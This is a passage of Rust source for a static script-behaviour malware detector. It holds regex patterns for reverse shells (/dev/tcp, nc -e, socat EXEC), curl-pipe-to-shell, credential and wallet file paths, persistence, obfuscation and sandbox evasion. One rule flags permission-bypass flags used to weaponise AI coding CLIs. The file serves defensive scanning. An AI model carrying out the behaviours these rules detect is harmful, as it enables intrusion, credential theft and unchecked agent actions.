//! Static behavioral analysis of script files.
//!
//! [`ScriptBehaviorEngine`] operates over any [`FileKind::is_script()`] file
//! (JS/TS/Python/Shell/PowerShell/Ruby/PHP) and detects dangerous behaviors
//! from the source text alone: command execution, credential harvesting,
//! persistence writes, reverse shells, download-and-execute, and obfuscation.
//!
//! No regex is compiled more than once — all patterns are built lazily via
//! [`std::sync::OnceLock`].

use std::sync::OnceLock;

use regex::Regex;

use crate::engine::{DetectionEngine, FileKind, FileUnit, ScanContext};
use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};

// ── Engine name (must match every `Finding::engine` we stamp) ──────────────
const ENGINE: &str = "script_behavior";

// ═══════════════════════════════════════════════════════════════════════════
// Pattern registry — compiled once, re-used across every file
// ═══════════════════════════════════════════════════════════════════════════

/// One compiled rule.  The `name` field is the stable `rule_id`.
#[allow(dead_code)] // reason: struct defined for future table-driven use; fields accessed via pattern
struct Rule {
    name: &'static str,
    re: &'static OnceLock<Regex>,
    pattern: &'static str,
    category: ThreatCategory,
    severity: Severity,
    confidence: Confidence,
    title: &'static str,
    description: &'static str,
}

// Macro to declare a lazy regex with a private OnceLock.
macro_rules! lazy_re {
    ($name:ident, $pat:expr) => {
        static $name: OnceLock<Regex> = OnceLock::new();
    };
}

// ── JS/TS: child_process ────────────────────────────────────────────────────
lazy_re!(RE_CP_REQUIRE, "");
lazy_re!(RE_CP_EXEC, "");
lazy_re!(RE_CP_SPAWN, "");
lazy_re!(RE_CP_EXECSYNC, "");
lazy_re!(RE_VM_RUNNEWCTX, "");
lazy_re!(RE_DYN_REQUIRE, "");
lazy_re!(RE_DYN_IMPORT, "");

// ── JS/TS: eval / Function constructor ────────────────────────────────────
lazy_re!(RE_EVAL, "");
lazy_re!(RE_FUNCTION_CTOR, "");

// ── JS/TS / universal: obfuscation ────────────────────────────────────────
lazy_re!(RE_EVAL_ATOB, "");
lazy_re!(RE_BUF_B64_EVAL, "");
lazy_re!(RE_FROMCHARCODE, "");
lazy_re!(RE_HEX_STR_CHAIN, "");
lazy_re!(RE_0X_IDENTS, "");

// ── Credential / secret paths ─────────────────────────────────────────────
lazy_re!(RE_SSH_KEY, "");
lazy_re!(RE_AWS_CREDS, "");
lazy_re!(RE_NPMRC, "");
lazy_re!(RE_DOTENV_READ, "");
lazy_re!(RE_PROCESS_ENV_ENUM, "");
lazy_re!(RE_KEYTAR, "");
lazy_re!(RE_BROWSER_CRED, "");
lazy_re!(RE_SECRET_KEY_LITERAL, "");
lazy_re!(RE_CRYPTO_WALLET_STORE, "");
lazy_re!(RE_GEM_CREDENTIALS, "");

// ── Network sinks ─────────────────────────────────────────────────────────
lazy_re!(RE_FETCH_XHR, "");
lazy_re!(RE_HTTP_REQUEST, "");
lazy_re!(RE_CURL_CMD, "");
lazy_re!(RE_WGET_CMD, "");
lazy_re!(RE_PYTHON_REQUESTS, "");
lazy_re!(RE_PYTHON_URLLIB, "");
lazy_re!(RE_SOCKET_CONNECT, "");

// ── Persistence ───────────────────────────────────────────────────────────
lazy_re!(RE_CRONTAB, "");
lazy_re!(RE_BASHRC_WRITE, "");
lazy_re!(RE_SYSTEMD_WRITE, "");
lazy_re!(RE_WIN_RUNKEY, "");

// ── Reverse shell ─────────────────────────────────────────────────────────
lazy_re!(RE_REVSHELL_BASH, "");
lazy_re!(RE_REVSHELL_PYTHON, "");
lazy_re!(RE_REVSHELL_PERL, "");
lazy_re!(RE_NC_E, "");
lazy_re!(RE_SOCAT_EXEC, "");

// ── Download-and-execute ──────────────────────────────────────────────────
lazy_re!(RE_CURL_BASH, "");
lazy_re!(RE_WGET_BASH, "");
lazy_re!(RE_DOWNLOAD_EXEC_JS, "");
lazy_re!(RE_POWERSHELL_IEX, "");
lazy_re!(RE_PYTHON_EXEC_DOWNLOAD, "");

// ── Python exec / os / subprocess ─────────────────────────────────────────
lazy_re!(RE_PY_OS_SYSTEM, "");
lazy_re!(RE_PY_SUBPROCESS, "");
lazy_re!(RE_PY_EVAL, "");
lazy_re!(RE_PY_EXEC, "");

// ── Shell: dangerous constructs ────────────────────────────────────────────
lazy_re!(RE_SH_EVAL, "");
lazy_re!(RE_SH_BASE64_PIPE, "");

// ── PowerShell ────────────────────────────────────────────────────────────
lazy_re!(RE_PS_ENCODED_CMD, "");
lazy_re!(RE_PS_DOWNLOAD_STRING, "");
lazy_re!(RE_PS_BYPASS, "");

// ── Ruby ──────────────────────────────────────────────────────────────────
lazy_re!(RE_RUBY_SYSTEM, "");
lazy_re!(RE_RUBY_BACKTICK, "");
lazy_re!(RE_RUBY_EVAL, "");

// ── PHP ───────────────────────────────────────────────────────────────────
lazy_re!(RE_PHP_EXEC, "");
lazy_re!(RE_PHP_EVAL, "");
lazy_re!(RE_PHP_BASE64, "");
lazy_re!(RE_PHP_PREG_REPLACE_E, "");

// ── KB §4.4 SB-01..SB-12 + GAP-A additions ───────────────────────────────
lazy_re!(RE_NPMRC_AUTH_TOKEN, "");
lazy_re!(RE_AI_CLI_COERCION, "");
lazy_re!(RE_GIT_TEMPLATE_DIR, "");
lazy_re!(RE_GITHUB_TOKEN_PREFIX_CHECK, "");
lazy_re!(RE_ENV_CRED_PATTERN_SWEEP, "");
lazy_re!(RE_GEOFENCE_GEO_API, "");
lazy_re!(RE_GEOFENCE_TIMEZONE, "");
lazy_re!(RE_SANDBOX_EVASION_CI, "");
lazy_re!(RE_SANDBOX_EVASION_USERNAME, "");
lazy_re!(RE_STRING_FRAGMENT_REQUIRE, "");
lazy_re!(RE_DOUBLE_ENCODED_C2, "");
lazy_re!(RE_PTH_OS_BRANCH_EXEC, "");
// GAP-A: eval wrapping Buffer.from(...,'base64'...) — the outer/inverted form.
// PAT_BUF_B64_EVAL requires Buffer.from to appear BEFORE eval in the expression;
// the wrapped form eval(Buffer.from(b64,'base64').toString()) has eval as the outermost
// call. This separate OnceLock holds the complementary pattern that catches it.
lazy_re!(RE_EVAL_BUF_B64_OUTER, "");

// Helper: initialise a OnceLock<Regex> from a pattern string, returning None
// on a regex compile error so the engine degrades gracefully.
fn get_re(lock: &'static OnceLock<Regex>, pattern: &'static str) -> Option<&'static Regex> {
    Some(lock.get_or_init(|| {
        // Patterns are all compile-time constants; this should never fail.
        // We assert at test time that every pattern compiles.
        Regex::new(pattern).unwrap_or_else(|_| {
            // Fallback: a regex that matches nothing, so the engine
            // continues without this rule rather than panicking.
            // Fallback matches nothing: a character class that can never match.
            Regex::new(r"[^\s\S]").expect("invariant: never-match fallback regex must compile")
        })
    }))
}

// ── Pattern strings ────────────────────────────────────────────────────────
//
// All patterns use (?i) for case-insensitivity where that helps; we compile
// with the `regex` crate's default (no DOTALL/multiline flags) unless needed.
// Patterns MUST NOT create catastrophic backtracking.

const PAT_CP_REQUIRE: &str = r#"require\s*\(\s*['"`]child_process['"`]\s*\)"#;

const PAT_CP_EXEC: &str = r#"(?:^|[^\w.])exec\s*\("#;

const PAT_CP_SPAWN: &str = r#"\.spawn\s*\(|\.spawnSync\s*\("#;

const PAT_CP_EXECSYNC: &str = r#"\.execSync\s*\(|\.execFileSync\s*\("#;

const PAT_VM_RUNNEWCTX: &str = r#"vm\.runInNewContext|vm\.runInThisContext|vm\.Script"#;

// Dynamic require: require(variable) or require(`template`)
const PAT_DYN_REQUIRE: &str = r#"require\s*\(\s*(?!['"` ])(?:[^'"`)]+)\)"#;

// Dynamic import: import(variable) or import(`template`)
const PAT_DYN_IMPORT: &str = r#"\bimport\s*\(\s*(?!['"`])(?:[^'"`)]+)\)"#;

const PAT_EVAL: &str = r#"\beval\s*\("#;

const PAT_FUNCTION_CTOR: &str = r#"\bnew\s+Function\s*\("#;

// eval(atob(...))
const PAT_EVAL_ATOB: &str = r#"\beval\s*\(\s*atob\s*\("#;

// Buffer.from(x,'base64').toString() followed by eval on same / adjacent line
const PAT_BUF_B64_EVAL: &str = r#"Buffer\.from\s*\([^)]*,\s*['"]base64['"]\s*\)(?:[^;{]*\.toString\s*\(\s*\)[^;{]*)?[^;{]*eval\s*\("#;

// String.fromCharCode loops / arrays
const PAT_FROMCHARCODE: &str = r#"(?i)String\.fromCharCode\s*\([^)]*\d{2}"#;

// Dense hex string chain: \x followed by many escaped hex escapes
const PAT_HEX_STR_CHAIN: &str = r#"(?:\\x[0-9a-fA-F]{2}){6,}"#;

// _0x identifier density: ≥3 occurrences of _0x patterns (obfuscator sigil)
const PAT_0X_IDENTS: &str = r#"_0x[0-9a-fA-F]{3,}"#;

// SSH key/config paths
const PAT_SSH_KEY: &str = r#"(?i)[/~]['"`]?\s*\.ssh\s*/\s*(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys|known_hosts|config)"#;

// AWS credential file
const PAT_AWS_CREDS: &str = r#"(?i)[/~]['"`]?\s*\.aws\s*/\s*(?:credentials|config)"#;

// .npmrc (can contain auth tokens)
const PAT_NPMRC: &str = r#"(?i)[/~]['"`]?\s*\.npmrc"#;

// .env read (fs.readFile / open / readFileSync)
const PAT_DOTENV_READ: &str = r#"(?i)(?:readFile|readFileSync|open)\s*\([^)]*\.env[^)]*\)"#;

// process.env enumeration: Object.keys/values/entries(process.env)
const PAT_PROCESS_ENV_ENUM: &str =
    r#"Object\s*\.\s*(?:keys|values|entries)\s*\(\s*process\s*\.\s*env\s*\)"#;

// keytar (OS keychain access)
const PAT_KEYTAR: &str = r#"\bkeytar\b"#;

// Browser credential stores (Chrome/Firefox wallet paths)
const PAT_BROWSER_CRED: &str =
    r#"(?i)(?:Login\s+Data|key4\.db|logins\.json|Cookies|Local\s+State)['"` /]"#;

// Secret/key literal assignment: variable names containing secret/token/password/api_key
const PAT_SECRET_KEY_LITERAL: &str = r#"(?i)(?:secret|api_?key|auth_?token|access_?token|private_?key|password|passwd)\s*[:=]\s*['"`][A-Za-z0-9+/=_\-\.]{8,}"#;

// Crypto wallet store / seed-phrase file access (BeaverTail/W4SP-class stealers).
// Specific store filenames/paths — NOT the bare word "wallet" — so benign UX code
// that mentions a wallet balance widget does not fire. Cross-engine partner of the
// rules-engine CRYPTO_WALLET_FILE_ACCESS: firing here sets has_cred_read so a wallet
// harvest + network sink escalates via the SB_CHAIN_CRED_EXFIL chain to Malicious.
const PAT_CRYPTO_WALLET_STORE: &str = r#"(?i)(?:exodus\.wallet|wallet\.dat|nkbihfbeogaeaoehlefnkodbefgpgknn|\.config[/\\]solana[/\\]id\.json|\.ethereum[/\\]keystore|(?:seed[_-]?phrase|mnemonic|recovery[_-]?phrase)\.txt)"#;

// RubyGems publish-credential access (cross-ecosystem worm fuel). Partner of the
// rules-engine CRED_RUBYGEMS_TOKEN — firing here sets has_cred_read so gem-token
// theft + a network sink escalates via SB_CHAIN_CRED_EXFIL to Malicious.
const PAT_GEM_CREDENTIALS: &str =
    r#"(?i)(?:\.gem[/\\]credentials|GEM_HOST_API_KEY|rubygems_api_key)"#;

// fetch / XMLHttpRequest / axios
const PAT_FETCH_XHR: &str = r#"\bfetch\s*\(|\bnew\s+XMLHttpRequest\b|\baxios\s*\.\s*(?:get|post|put|delete|request)\s*\(|\bhttp(?:s?)\s*\.\s*(?:get|request)\s*\("#;

// http/https.request or .get in Node (broader)
const PAT_HTTP_REQUEST: &str = r#"\brequire\s*\(\s*['"`]https?['"`]\s*\)"#;

// curl command invocation inside shell/JS string
const PAT_CURL_CMD: &str = r#"\bcurl\b.*(?:-[sSfLo]|\s+https?://)"#;

// wget command invocation
const PAT_WGET_CMD: &str = r#"\bwget\b.*https?://"#;

// Python requests / urllib
const PAT_PYTHON_REQUESTS: &str =
    r#"\brequests\s*\.\s*(?:get|post|put|delete|request|Session)\s*\("#;

const PAT_PYTHON_URLLIB: &str = r#"\burllib(?:lib)?\s*\.\s*(?:request|urlopen|Request)\b"#;

// TCP socket connect (Node net.connect / net.createConnection / Python socket.connect)
// GAP-B fix: net.createConnection() is the canonical Node.js reverse-shell API and was
// previously absent from this pattern, causing reverse-shell chains to miss has_network_sink.
const PAT_SOCKET_CONNECT: &str =
    r#"\bnet\s*\.\s*(?:connect|createConnection)\s*\(|\bsocket\s*\.\s*connect\s*\("#;

// crontab write / cron.d
const PAT_CRONTAB: &str = r#"(?i)(?:crontab\s+-[lu]|/etc/cron(?:tab|\.d|\.(?:daily|weekly|hourly|monthly))|crontab\s*<<)"#;

// Writing to ~/.bashrc / ~/.profile / ~/.bash_profile
const PAT_BASHRC_WRITE: &str =
    r#"(?i)(?:\.bashrc|\.bash_profile|\.zshrc|\.profile|/etc/profile|/etc/bash\.bashrc)"#;

// Writing to systemd unit paths
const PAT_SYSTEMD_WRITE: &str =
    r#"(?i)(?:/etc/systemd/system|/usr/lib/systemd/system|~?/\.config/systemd/user)"#;

// Windows registry Run key
const PAT_WIN_RUNKEY: &str = r#"(?i)(?:HKEY_(?:LOCAL_MACHINE|CURRENT_USER)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce)"#;

// package.json bin field (self-elevating via npm link / postinstall)
#[allow(dead_code)] // reason: reserved for future bin-hijack detection rule
const PAT_NPM_PKG_BIN: &str = r#"(?i)"bin"\s*:\s*\{"#;

// Reverse shell: bash /dev/tcp pattern
const PAT_REVSHELL_BASH: &str = r#"/dev/tcp/|bash\s+-i\s+>&\s*/dev/(?:tcp|udp)|0>&1\s+2>&1"#;

// Python reverse shell socket boilerplate
const PAT_REVSHELL_PYTHON: &str =
    r#"(?i)import\s+socket.*(?:connect|bind)|socket\.socket\s*\(\s*socket\.AF_INET"#;

// Perl reverse shell
const PAT_REVSHELL_PERL: &str = r#"(?i)use\s+Socket\s*;.*(?:connect|INET)|IO::Socket::INET"#;

// nc -e / ncat -e (exec a shell over network)
const PAT_NC_E: &str = r#"\bnc(?:at)?\b.*-e\s+/bin/"#;

// socat exec shell
const PAT_SOCAT_EXEC: &str = r#"\bsocat\b.*EXEC:"#;

// curl | bash / wget | bash (download-and-execute in shell)
const PAT_CURL_BASH: &str = r#"\bcurl\b[^|]*\|\s*(?:ba)?sh\b"#;

const PAT_WGET_BASH: &str = r#"\bwget\b[^|]*\|\s*(?:ba)?sh\b"#;

// JS: download a script then eval/exec it
const PAT_DOWNLOAD_EXEC_JS: &str = r#"(?i)(?:fetch|http(?:s?)\.get|axios\.get)\s*\([^)]+\)[\s\S]{0,200}(?:eval|exec|Function\s*\()"#;

// PowerShell: Invoke-Expression (IEX) / Invoke-Command with downloaded content
const PAT_POWERSHELL_IEX: &str = r#"(?i)(?:Invoke-Expression|IEX)\s*\((?:\s*New-Object\s+Net\.WebClient|\s*\[Net\.WebClient\]|\s*Invoke-WebRequest)"#;

// Python: exec(requests.get(...).text)
const PAT_PYTHON_EXEC_DOWNLOAD: &str =
    r#"(?i)exec\s*\(\s*(?:requests|urllib)[\s\S]{0,100}\.(?:text|read\s*\(\s*\))"#;

// Python os.system
const PAT_PY_OS_SYSTEM: &str = r#"\bos\s*\.\s*system\s*\("#;

// Python subprocess
const PAT_PY_SUBPROCESS: &str =
    r#"\bsubprocess\s*\.\s*(?:Popen|call|run|check_output|check_call)\s*\("#;

// Python eval
const PAT_PY_EVAL: &str = r#"\beval\s*\("#;

// Python exec
const PAT_PY_EXEC: &str = r#"\bexec\s*\("#;

// Shell eval
const PAT_SH_EVAL: &str = r#"\beval\s+"#;

// Shell: base64 decode piped into shell
const PAT_SH_BASE64_PIPE: &str = r#"base64\s+(?:-d|--decode)[^|]*\|\s*(?:ba)?sh\b"#;

// PowerShell: EncodedCommand (-enc / -encodedCommand)
const PAT_PS_ENCODED_CMD: &str = r#"(?i)-(?:enc(?:odedCommand)?|e\s)\s+[A-Za-z0-9+/]{20,}"#;

// PowerShell: DownloadString / DownloadFile
const PAT_PS_DOWNLOAD_STRING: &str =
    r#"(?i)(?:DownloadString|DownloadFile|WebClient|Invoke-WebRequest|wget\s+https?://)"#;

// PowerShell: bypass execution policy
const PAT_PS_BYPASS: &str = r#"(?i)-(?:ExecutionPolicy|ep)\s+(?:Bypass|Unrestricted)"#;

// Ruby system() / `` backtick / exec()
const PAT_RUBY_SYSTEM: &str =
    r#"\bsystem\s*\(|\bexec\s*\(|\bspawn\s*\(|\bIO\.popen\s*\(|\bOpen3\b"#;

const PAT_RUBY_BACKTICK: &str = r#"`[^`]{5,}`"#;

const PAT_RUBY_EVAL: &str =
    r#"\beval\s*\(|\binstance_eval\s*\(|\bclass_eval\s*\(|\bmodule_eval\s*\("#;

// PHP: exec/system/shell_exec/passthru/proc_open
const PAT_PHP_EXEC: &str =
    r#"(?i)\b(?:exec|system|shell_exec|passthru|proc_open|popen|pcntl_exec)\s*\("#;

const PAT_PHP_EVAL: &str = r#"\beval\s*\("#;

// PHP: base64_decode + eval
const PAT_PHP_BASE64: &str =
    r#"(?i)eval\s*\(\s*(?:gzinflate|str_rot13|base64_decode|gzuncompress|gzdecode)\s*\("#;

// PHP: preg_replace with /e modifier (deprecated code execution)
const PAT_PHP_PREG_REPLACE_E: &str = r#"(?i)preg_replace\s*\(\s*['"`][^'"` ]*\/e[^'"`]*['"`]"#;

// ── KB §4.4 additions ─────────────────────────────────────────────────────

// SB-01: npm auth token field access (_authToken / npm_config__authtoken)
// Catches: eslint-scope, Shai-Hulud, s1ngularity (the exact field harvested by worms)
const PAT_NPMRC_AUTH_TOKEN: &str = r#"(?i)_authToken|npm_config__authtoken|npm_config__auth\b"#;

// SB-02: AI CLI coercion flags — permission bypass args to AI assistant binaries
// Catches: s1ngularity/Nx (weaponized Claude Code invocation with all gates disabled)
const PAT_AI_CLI_COERCION: &str =
    r#"--dangerously-skip-permissions|--yolo\b|--trust-all-tools|--no-interactive\b"#;

// SB-03: git global template directory persistence
// Catches: SANDWORM_MODE (hooks injected into every future `git init`)
const PAT_GIT_TEMPLATE_DIR: &str = r#"git\s+config\s+--global\s+init\.templateDir"#;

// SB-04: GitHub token prefix fingerprinting in install scripts
// Catches: s1ngularity (validates harvested PATs before worm propagation step)
const PAT_GITHUB_TOKEN_PREFIX_CHECK: &str =
    r#"(?:startsWith\s*\(\s*['"](?:gho_|ghp_|ghr_|ghs_)|/\^(?:gho_|ghp_|ghr_|ghs_)/)"#;

// SB-06: env var sweep for credential-pattern names — matches a JS regex literal of the form
// /(TOKEN|KEY|SECRET|PASSWORD)/i applied to env var names.  The pattern is intentionally
// anchored to the JS regex-literal syntax `/…/[i]?` to avoid FPs on identifiers like `apiKey`.
// Catches: SANDWORM_MODE Stage 1, MSTIC dep-confusion, crossenv
const PAT_ENV_CRED_PATTERN_SWEEP: &str =
    r#"/\(TOKEN\|KEY\|SECRET\|PASSWORD\)/i?|/TOKEN\|KEY\|SECRET\|PASSWORD/i?"#;

// SB-07: Geofencing — IP geolocation API calls in lifecycle scripts
// Catches: ua-parser-js, node-ipc (CIS-country exclusion gate for wiper)
const PAT_GEOFENCE_GEO_API: &str =
    r#"(?i)freegeoip\.app|ipinfo\.io|ip-api\.com|ipgeolocation\.io|geoip\.maxmind\.com"#;

// SB-07 (timezone variant): Intl.DateTimeFormat timezone or timezone locale literals
const PAT_GEOFENCE_TIMEZONE: &str = r#"(?i)Intl\.DateTimeFormat\(\)\.resolvedOptions\(\)\.timeZone|Europe/Moscow|Europe/Kaliningrad|Asia/Yekaterinburg|Asia/Novosibirsk|Asia/Krasnoyarsk|Asia/Irkutsk|Asia/Yakutsk|Asia/Vladivostok|ru_RU"#;

// SB-08: Sandbox/CI evasion — early-return on CI env var
// Catches: SeedSweep, WhiteSnake (only fires on real developer machines)
const PAT_SANDBOX_EVASION_CI: &str = r#"process\.env\.CI\b"#;

// SB-08: Sandbox evasion — username/hostname checks for analysis evasion
const PAT_SANDBOX_EVASION_USERNAME: &str = r#"(?i)(?:runner|sandbox|jenkins|gitlab|travis|circleci)\b.*(?:username|user|whoami|hostname)|(?:username|user|whoami)\b.*(?:runner|sandbox|jenkins|gitlab|travis|circleci)"#;

// SB-09: String fragment reassembly of require() argument
// Catches: eslint-config-prettier/Scavenger (require('chi'+'ld_pro'+'cess'))
const PAT_STRING_FRAGMENT_REQUIRE: &str = r#"require\s*\(\s*['"][^'"]+['"]\s*\+"#;

// SB-10: Double-encoded base64 C2 — Buffer.from literal that itself decodes to base64
// Catches: @am-fe double-base64 C2 domain, node-ipc double-encoded API URL
const PAT_DOUBLE_ENCODED_C2: &str =
    r#"Buffer\.from\s*\(\s*['"][A-Za-z0-9+/]{20,}={0,2}['"]\s*,\s*['"]base64['"]\s*\)"#;

// SB-12: Python .pth file with OS-branched exec at interpreter startup
// Catches: CanisterSprawl, Hades (fires at every Python startup before any user import)
const PAT_PTH_OS_BRANCH_EXEC: &str = r#"(?:os\.name|sys\.platform)\b"#;

// GAP-A: eval() wrapping Buffer.from(...,'base64'...) — the mirrored obfuscation form.
// The existing PAT_BUF_B64_EVAL catches Buffer.from(...).toString() followed by eval(),
// but the wrapped form eval(Buffer.from(b64,'base64').toString()) nests them the other
// way around, with eval( as the outermost call. This pattern catches that form and emits
// the same rule_id SB_JS_BUF_B64_EVAL so it registers as the same signal.
const PAT_EVAL_BUF_B64_OUTER: &str =
    r#"\beval\s*\(\s*Buffer\.from\s*\([^)]*,\s*['"]base64['"]\s*\)"#;

// ── Logical-line reconstruction (cross-line evasion defence) ────────────────
//
// The per-line rules below match each physical line independently, so an
// attacker can defeat them by wrapping a call across several physical lines —
// a `prettier`-style reflow of `require('child_process')` into
// `require(\n  'child_process'\n)`, or a `\`-continuation, splits the tokens
// onto separate lines that no single-line regex sees. `logical_lines` folds a
// call/argument list that is left open (unbalanced `(`/`[`) or a line ending
// in a `\` continuation onto the following physical line(s), so the per-line
// rules see the reassembled call. Joins are bounded (`MAX_JOIN` physical lines,
// `MAX_LEN` bytes) so a pathologically nested file can never collapse to one
// giant line, and the reported line number is the FIRST physical line of the
// group. Only parentheses/brackets drive joining — braces (`{}`) do not, so
// ordinary multi-line object/block literals are left as separate lines.
fn logical_lines(text: &str) -> Vec<(usize, String)> {
    const MAX_JOIN: usize = 25;
    const MAX_LEN: usize = 8192;

    let physical: Vec<&str> = text.lines().collect();
    let mut out: Vec<(usize, String)> = Vec::with_capacity(physical.len());
    let mut i = 0;
    while i < physical.len() {
        let start_lineno = i + 1;
        let mut buf = String::new();
        let mut joined = 0usize;
        loop {
            let line = physical[i];
            // A trailing `\` is a shell/JS line continuation: drop it and fold.
            let (frag, had_backslash) = match line.strip_suffix('\\') {
                Some(f) => (f, true),
                None => (line, false),
            };
            if !buf.is_empty() {
                buf.push(' ');
            }
            buf.push_str(frag);
            i += 1;
            joined += 1;

            if i >= physical.len() || joined >= MAX_JOIN || buf.len() >= MAX_LEN {
                break;
            }
            // Keep folding while a call/argument list is still open, or the
            // just-consumed physical line asked for continuation via `\`.
            if bracket_delta(&buf) <= 0 && !had_backslash {
                break;
            }
        }
        out.push((start_lineno, buf));
    }
    out
}

/// Net count of unclosed `(`/`[` in `s` (opens minus closes). Positive means a
/// call/argument list is still open at the end of `s`. Brace `{}` block scope is
/// intentionally excluded so ordinary multi-line object literals do not fold.
/// This is a cheap heuristic (it does not track string/comment context), which
/// can only over-count opens — folding extra benign lines re-exposes the same
/// matches a single-line scan already makes, never a new false-positive class.
fn bracket_delta(s: &str) -> i32 {
    let mut delta = 0i32;
    for b in s.bytes() {
        match b {
            b'(' | b'[' => delta += 1,
            b')' | b']' => delta -= 1,
            _ => {}
        }
    }
    delta
}

// ─────────────────────────────────────────────────────────────────────────────
// ScriptBehaviorEngine
// ─────────────────────────────────────────────────────────────────────────────

/// Static behavioral analysis for script files (JS/TS/Python/Shell/PS/Ruby/PHP).
///
/// Detects: command execution, credential harvesting, persistence,
/// reverse shells, download-and-execute, obfuscation, and combined
/// capability+network-sink (exfiltration chain).
#[derive(Debug, Default)]
pub struct ScriptBehaviorEngine;

impl ScriptBehaviorEngine {
    fn analyze_file(&self, file: &FileUnit, findings: &mut Vec<Finding>) {
        // Cap text fed to regex evaluation to guard against adversarially huge
        // files causing slow NFA traversal.  A HEAD+TAIL window (not a head-only
        // truncation) closes the pad-before-payload evasion uniformly with the
        // other text engines.
        const MAX_SCAN_BYTES: usize = 8 * 1024 * 1024;
        let text: std::borrow::Cow<'_, str> =
            crate::engine::scan_window(file.text_lossy(), MAX_SCAN_BYTES);

        let path = &file.rel_path;
        let kind = file.kind;

        // We do a line-indexed scan so we can report line numbers. Physical
        // lines are folded into logical lines (see `logical_lines`) so a call
        // wrapped across several physical lines — a common formatter/obfuscation
        // evasion — is still matched by the per-line rules below.
        let lines: Vec<(usize, String)> = logical_lines(&text);

        // --- Capability flags accumulated for chain detection ---
        let mut has_cred_read = false;
        let mut has_network_sink = false;
        let mut has_cmd_exec = false;
        let mut has_obfuscation = false;
        let mut has_download = false;

        // ── 1. Child-process / command execution (JS/TS) ─────────────────────
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript) {
            // require('child_process')
            if let Some(re) = get_re(&RE_CP_REQUIRE, PAT_CP_REQUIRE) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "child_process import detected",
                                "The file imports Node.js child_process, enabling arbitrary command execution. Common in supply-chain malware postinstall scripts.",
                            )
                            .with_rule_id("SB_JS_CHILD_PROCESS_REQUIRE")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break; // one finding per file for this rule
                    }
                }
            }

            // .exec() call
            if let Some(re) = get_re(&RE_CP_EXEC, PAT_CP_EXEC) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "exec() call detected",
                                "Call to .exec() can run arbitrary shell commands. When present alongside child_process import, this is a strong malware indicator.",
                            )
                            .with_rule_id("SB_JS_EXEC_CALL")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // .execSync()
            if let Some(re) = get_re(&RE_CP_EXECSYNC, PAT_CP_EXECSYNC) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "execSync/execFileSync call detected",
                                "Synchronous command execution in a package script is a common supply-chain malware pattern.",
                            )
                            .with_rule_id("SB_JS_EXECSYNC_CALL")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // .spawn()
            if let Some(re) = get_re(&RE_CP_SPAWN, PAT_CP_SPAWN) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "spawn/spawnSync call detected",
                                "Process spawning allows arbitrary command execution. Common in supply-chain malware.",
                            )
                            .with_rule_id("SB_JS_SPAWN_CALL")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // vm.runInNewContext
            if let Some(re) = get_re(&RE_VM_RUNNEWCTX, PAT_VM_RUNNEWCTX) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "vm sandbox execution detected",
                                "Node.js vm module can execute arbitrary code and is used to bypass simpler analysis.",
                            )
                            .with_rule_id("SB_JS_VM_SANDBOX")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // Dynamic require
            if let Some(re) = get_re(&RE_DYN_REQUIRE, PAT_DYN_REQUIRE) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::Medium,
                                Confidence::Medium,
                                "Dynamic require() with variable argument",
                                "require() called with a non-literal argument hides the loaded module from static analysis.",
                            )
                            .with_rule_id("SB_JS_DYNAMIC_REQUIRE")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // Dynamic import()
            if let Some(re) = get_re(&RE_DYN_IMPORT, PAT_DYN_IMPORT) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::Medium,
                                Confidence::Medium,
                                "Dynamic import() with variable argument",
                                "import() called with a non-literal argument hides the loaded module from static analysis.",
                            )
                            .with_rule_id("SB_JS_DYNAMIC_IMPORT")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 2. eval / Function constructor (JS/TS/Python/Shell/Ruby/PHP) ──────
        {
            let (re_lock, pat, rule_id): (&'static OnceLock<Regex>, &'static str, &str) = match kind
            {
                FileKind::Javascript | FileKind::TypeScript => (&RE_EVAL, PAT_EVAL, "SB_JS_EVAL"),
                FileKind::Python => (&RE_PY_EVAL, PAT_PY_EVAL, "SB_PY_EVAL"),
                FileKind::Ruby => (&RE_RUBY_EVAL, PAT_RUBY_EVAL, "SB_RB_EVAL"),
                FileKind::Php => (&RE_PHP_EVAL, PAT_PHP_EVAL, "SB_PHP_EVAL"),
